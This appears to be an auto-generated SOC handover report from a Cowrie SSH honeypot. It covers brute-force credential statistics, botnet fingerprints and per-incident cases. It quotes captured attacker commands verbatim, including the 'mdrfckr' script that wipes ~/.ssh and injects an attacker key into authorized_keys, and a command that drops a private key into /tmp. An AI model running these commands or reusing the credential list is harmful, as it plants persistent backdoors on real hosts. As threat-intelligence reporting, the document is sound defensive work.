# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T18:35:01Z |
| **Shift Time** | 18:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **137** |
| Confirmed Threats | **128** |
| False Positives Filtered | **9** (6.6%) |
| Unique Attacker IPs | **66** |
| Countries of Origin | **28** |
| High Severity Cases | **68** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **69** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **90** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **12** |
| Unique Passwords | **43** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `debian` | 16 |
| `ubuntu` | 12 |
| `support` | 10 |
| `admin` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `guest2003` | 6 |
| `debian2021` | 6 |
| `password123` | 6 |
| `debian2022` | 6 |
| `support2009` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `guest` | `guest2003` | 6 |
| `debian` | `debian2021` | 6 |
| `default` | `password123` | 6 |
| `debian` | `debian2022` | 6 |
| `support` | `support2009` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `admin` | `89.247.32.242` | 2026-08-23T14:56:13 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-23T14:56:15 |
| `root` | `﻿------fuck------` | `43.108.42.244` | 2026-08-23T14:56:51 |
| `test` | `test2022` | `196.188.187.205` | 2026-08-23T14:57:50 |
| `test` | `test2022` | `85.164.15.194` | 2026-08-23T14:57:57 |
| `test` | `test2022` | `169.211.207.4` | 2026-08-23T14:58:03 |
| `test` | `test2022` | `201.28.234.10` | 2026-08-23T14:58:12 |
| `support` | `support2009` | `10.0.0.73` | 2026-08-23T14:58:30 |
| `support` | `support2009` | `61.2.228.177` | 2026-08-23T15:00:17 |
| `ubuntu` | `1234@A` | `217.60.255.130` | 2026-08-23T15:02:39 |
| `root` | `Priya@123` | `217.60.255.130` | 2026-08-23T15:02:43 |
| `unknown` | `qwerty` | `10.0.0.73` | 2026-08-23T15:03:39 |
| `ubuntu` | `Temp@123` | `217.60.255.130` | 2026-08-23T15:12:01 |
| `root` | `Radha@123` | `217.60.255.130` | 2026-08-23T15:12:05 |
| `guest` | `guest2003` | `10.0.0.73` | 2026-08-23T15:12:54 |
| `root` | `Nikhil@123` | `172.178.16.179` | 2026-08-23T15:14:37 |
| `345gs5662d34` | `345gs5662d34` | `172.178.16.179` | 2026-08-23T15:14:38 |
| `root` | `3245gs5662d34` | `172.178.16.179` | 2026-08-23T15:14:39 |
| `support` | `support2009` | `190.223.36.108` | 2026-08-23T15:15:28 |
| `support` | `support2009` | `60.172.1.210` | 2026-08-23T15:15:39 |
| `unknown` | `qwerty` | `36.64.36.101` | 2026-08-23T15:20:08 |
| `unknown` | `qwerty` | `118.43.236.237` | 2026-08-23T15:20:17 |
| `ubuntu` | `India123` | `217.60.255.130` | 2026-08-23T15:21:35 |
| `root` | `Sandeep@123` | `217.60.255.130` | 2026-08-23T15:21:39 |
| `admin` | `p@ssw0rd` | `10.0.0.73` | 2026-08-23T15:23:36 |
| `debian` | `debian2021` | `93.177.157.179` | 2026-08-23T15:25:02 |
| `debian` | `debian2021` | `218.202.91.147` | 2026-08-23T15:25:11 |
| `guest` | `guest2003` | `103.59.4.36` | 2026-08-23T15:30:32 |
| `guest` | `guest2003` | `38.199.201.3` | 2026-08-23T15:30:41 |
| `guest` | `guest2003` | `99.224.131.187` | 2026-08-23T15:30:44 |
| `guest` | `guest2003` | `121.178.185.141` | 2026-08-23T15:30:54 |
| `support` | `support2012` | `10.0.0.73` | 2026-08-23T15:31:00 |
| `ubuntu` | `Trinity@123` | `217.60.255.130` | 2026-08-23T15:31:03 |
| `root` | `Raju@123` | `217.60.255.130` | 2026-08-23T15:31:08 |
| `debian` | `debian2021` | `10.0.0.73` | 2026-08-23T15:36:04 |
| `ubuntu` | `Techno@123` | `217.60.255.130` | 2026-08-23T15:40:32 |
| `root` | `Gaurav@123` | `217.60.255.130` | 2026-08-23T15:40:35 |
| `support` | `support2012` | `91.146.167.76` | 2026-08-23T15:47:52 |
| `support` | `support2012` | `203.188.242.10` | 2026-08-23T15:48:00 |
| `ubuntu` | `admin@admin` | `217.60.255.130` | 2026-08-23T15:49:58 |
| `root` | `Ajay@123` | `217.60.255.130` | 2026-08-23T15:50:01 |
| `debian` | `debian2021` | `210.4.68.72` | 2026-08-23T15:52:35 |
| `debian` | `debian2021` | `194.59.245.3` | 2026-08-23T15:52:43 |
| `Administrator` | `admin` | `45.154.244.193` | 2026-08-23T15:54:00 |
| `ubuntu` | `ubuntu123` | `217.60.255.130` | 2026-08-23T15:59:30 |
| `root` | `System@2023` | `217.60.255.130` | 2026-08-23T15:59:34 |
| `admin` | `admin2016` | `153.37.177.219` | 2026-08-23T16:03:18 |
| `admin` | `admin2016` | `128.185.12.179` | 2026-08-23T16:03:30 |
| `admin` | `admin2016` | `218.202.143.68` | 2026-08-23T16:03:31 |
| `root` | `root2002` | `10.0.0.73` | 2026-08-23T16:03:36 |
| `admin` | `admin2016` | `191.210.73.33` | 2026-08-23T16:03:41 |
| `root` | `root2002` | `189.56.0.19` | 2026-08-23T16:05:04 |
| `root` | `root2002` | `121.180.27.195` | 2026-08-23T16:05:15 |
| `supervisor` | `123321` | `10.0.0.73` | 2026-08-23T16:08:36 |
| `ubuntu` | `git2025` | `217.60.255.130` | 2026-08-23T16:08:57 |
| `root` | `System@2022` | `217.60.255.130` | 2026-08-23T16:09:01 |
| `default` | `password123` | `10.0.0.73` | 2026-08-23T16:18:19 |
| `ubuntu` | `dev@123` | `217.60.255.130` | 2026-08-23T16:18:24 |
| `root` | `Dilip@123` | `217.60.255.130` | 2026-08-23T16:18:27 |
| `root` | `root2002` | `60.166.31.198` | 2026-08-23T16:20:40 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T16:22:12 |
| `supervisor` | `123321` | `35.234.169.119` | 2026-08-23T16:25:10 |
| `ubuntu` | `gitlab@123` | `217.60.255.130` | 2026-08-23T16:27:49 |
| `root` | `Santosh@123` | `217.60.255.130` | 2026-08-23T16:27:53 |
| `debian` | `debian2019` | `175.198.18.3` | 2026-08-23T16:30:13 |
| `debian` | `debian2019` | `47.100.252.211` | 2026-08-23T16:30:24 |
| `default` | `password123` | `216.232.226.217` | 2026-08-23T16:35:53 |
| `default` | `password123` | `182.75.197.174` | 2026-08-23T16:36:02 |
| `debian` | `debian2022` | `10.0.0.73` | 2026-08-23T16:36:09 |
| `default` | `password123` | `41.90.236.3` | 2026-08-23T16:36:11 |
| `default` | `password123` | `218.25.233.22` | 2026-08-23T16:36:20 |
| `ubuntu` | `Admin@1234567890` | `217.60.255.130` | 2026-08-23T16:37:22 |
| `root` | `P@$$12` | `217.60.255.130` | 2026-08-23T16:37:26 |
| `debian` | `debian2022` | `175.7.144.4` | 2026-08-23T16:37:43 |
| `debian` | `debian2022` | `181.119.64.79` | 2026-08-23T16:37:51 |
| `Administrator` | `admin` | `10.0.0.73` | 2026-08-23T16:39:43 |
| `debian` | `debian2019` | `10.0.0.73` | 2026-08-23T16:41:06 |
| `ubuntu` | `!123Test` | `217.60.255.130` | 2026-08-23T16:46:49 |
| `root` | `Asd@123` | `217.60.255.130` | 2026-08-23T16:46:52 |
| `debian` | `debian2022` | `93.177.157.179` | 2026-08-23T16:53:09 |
| `debian` | `debian2022` | `186.215.107.189` | 2026-08-23T16:53:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **137** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 39 |
| libssh | 35 |
| Go SSH scanner | 3 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 39 | 38 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 39 | 38 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.178.16.179`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **66** |
| Unique ASNs | **50** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS141216` | GREAT GOLDEN HORSE COMPANY LIMITED | 2 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (68)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d8e10e6e4313

| Field | Detail |
|---|---|
| **Source IP** | `89.247.32[.]242` |
| **First Seen** | 2026-08-23 14:56 |
| **Last Seen** | 2026-08-23 14:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:56:11` | `cowrie.session.connect` |
| `2026-08-23 14:56:11` | `cowrie.client.version` |
| `2026-08-23 14:56:11` | `cowrie.client.kex` |
| `2026-08-23 14:56:13` | `cowrie.login.success` |
| `2026-08-23 14:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.247.32[.]242` to AbuseIPDB if not already reported
- [ ] Block `89.247.32[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7ed2963c92c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-23 14:56 |
| **Last Seen** | 2026-08-23 14:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:56:14` | `cowrie.session.connect` |
| `2026-08-23 14:56:14` | `cowrie.client.version` |
| `2026-08-23 14:56:15` | `cowrie.client.kex` |
| `2026-08-23 14:56:15` | `cowrie.login.success` |
| `2026-08-23 14:56:16` | `cowrie.session.params` |
| `2026-08-23 14:56:16` | `cowrie.command.input` |
| `2026-08-23 14:56:17` | `cowrie.session.file_download` |
| `2026-08-23 14:56:17` | `cowrie.session.file_download` |
| `2026-08-23 14:56:17` | `cowrie.log.closed` |
| `2026-08-23 14:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24f86f6531e2

| Field | Detail |
|---|---|
| **Source IP** | `43.108.42[.]244` |
| **First Seen** | 2026-08-23 14:56 |
| **Last Seen** | 2026-08-23 14:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:56:50` | `cowrie.session.connect` |
| `2026-08-23 14:56:50` | `cowrie.client.version` |
| `2026-08-23 14:56:50` | `cowrie.client.kex` |
| `2026-08-23 14:56:51` | `cowrie.login.success` |
| `2026-08-23 14:56:53` | `cowrie.session.params` |
| `2026-08-23 14:56:53` | `cowrie.command.input` |
| `2026-08-23 14:56:53` | `cowrie.log.closed` |
| `2026-08-23 14:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.108.42[.]244` to AbuseIPDB if not already reported
- [ ] Block `43.108.42[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea9b5ae0c20

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-08-23 14:57 |
| **Last Seen** | 2026-08-23 14:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:57:48` | `cowrie.session.connect` |
| `2026-08-23 14:57:49` | `cowrie.client.version` |
| `2026-08-23 14:57:49` | `cowrie.client.kex` |
| `2026-08-23 14:57:50` | `cowrie.login.success` |
| `2026-08-23 14:57:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57b15d6f33a

| Field | Detail |
|---|---|
| **Source IP** | `85.164.15[.]194` |
| **First Seen** | 2026-08-23 14:57 |
| **Last Seen** | 2026-08-23 14:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:57:55` | `cowrie.session.connect` |
| `2026-08-23 14:57:56` | `cowrie.client.version` |
| `2026-08-23 14:57:56` | `cowrie.client.kex` |
| `2026-08-23 14:57:57` | `cowrie.login.success` |
| `2026-08-23 14:57:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.164.15[.]194` to AbuseIPDB if not already reported
- [ ] Block `85.164.15[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f847cc0484dc

| Field | Detail |
|---|---|
| **Source IP** | `169.211.207[.]4` |
| **First Seen** | 2026-08-23 14:58 |
| **Last Seen** | 2026-08-23 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:58:01` | `cowrie.session.connect` |
| `2026-08-23 14:58:01` | `cowrie.client.version` |
| `2026-08-23 14:58:01` | `cowrie.client.kex` |
| `2026-08-23 14:58:03` | `cowrie.login.success` |
| `2026-08-23 14:58:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.207[.]4` to AbuseIPDB if not already reported
- [ ] Block `169.211.207[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92afd843f51a

| Field | Detail |
|---|---|
| **Source IP** | `201.28.234[.]10` |
| **First Seen** | 2026-08-23 14:58 |
| **Last Seen** | 2026-08-23 14:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 14:58:09` | `cowrie.session.connect` |
| `2026-08-23 14:58:10` | `cowrie.client.version` |
| `2026-08-23 14:58:10` | `cowrie.client.kex` |
| `2026-08-23 14:58:12` | `cowrie.login.success` |
| `2026-08-23 14:58:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 14:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.234[.]10` to AbuseIPDB if not already reported
- [ ] Block `201.28.234[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a48d66a4de

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-08-23 15:00 |
| **Last Seen** | 2026-08-23 15:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:00:15` | `cowrie.session.connect` |
| `2026-08-23 15:00:16` | `cowrie.client.version` |
| `2026-08-23 15:00:16` | `cowrie.client.kex` |
| `2026-08-23 15:00:17` | `cowrie.login.success` |
| `2026-08-23 15:00:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b70cddb682b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:02 |
| **Last Seen** | 2026-08-23 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:02:38` | `cowrie.session.connect` |
| `2026-08-23 15:02:38` | `cowrie.client.version` |
| `2026-08-23 15:02:38` | `cowrie.client.kex` |
| `2026-08-23 15:02:39` | `cowrie.login.success` |
| `2026-08-23 15:02:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:02:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:02:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21eb2dc98048

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:02 |
| **Last Seen** | 2026-08-23 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:02:42` | `cowrie.session.connect` |
| `2026-08-23 15:02:42` | `cowrie.client.version` |
| `2026-08-23 15:02:42` | `cowrie.client.kex` |
| `2026-08-23 15:02:43` | `cowrie.login.success` |
| `2026-08-23 15:02:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:02:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:02:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b6ee814917

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:12 |
| **Last Seen** | 2026-08-23 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:12:00` | `cowrie.session.connect` |
| `2026-08-23 15:12:00` | `cowrie.client.version` |
| `2026-08-23 15:12:00` | `cowrie.client.kex` |
| `2026-08-23 15:12:01` | `cowrie.login.success` |
| `2026-08-23 15:12:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:12:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:12:01` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02ddca0052c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 15:12 |
| **Last Seen** | 2026-08-23 15:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:12:04` | `cowrie.session.connect` |
| `2026-08-23 15:12:04` | `cowrie.client.version` |
| `2026-08-23 15:12:04` | `cowrie.client.kex` |
| `2026-08-23 15:12:05` | `cowrie.login.success` |
| `2026-08-23 15:12:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 15:12:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 15:12:05` | `cowrie.direct-tcpip.data` |
| `2026-08-23 15:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548811cf2d07

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-23 15:14 |
| **Last Seen** | 2026-08-23 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 15:14:37` | `cowrie.session.connect` |
| `2026-08-23 15:14:37` | `cowrie.client.version` |
| `2026-08-23 15:14:37` | `cowrie.client.kex` |
| `2026-08-23 15:14:37` | `cowrie.login.success` |
| `2026-08-23 15:14:38` | `cowrie.session.params` |
| `2026-08-23 15:14:38` | `cowrie.command.input` |
| `2026-08-23 15:14:38` | `cowrie.command.failed` |
| `2026-08-23 15:14:38` | `cowrie.log.closed` |
| `2026-08-23 15:14:38` | `cowrie.session.params` |
| `2026-08-23 15:14:38` | `cowrie.command.input` |
| `2026-08-23 15:14:38` | `cowrie.session.file_download` |
| `2026-08-23 15:14:38` | `cowrie.log.closed` |
| `2026-08-23 15:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
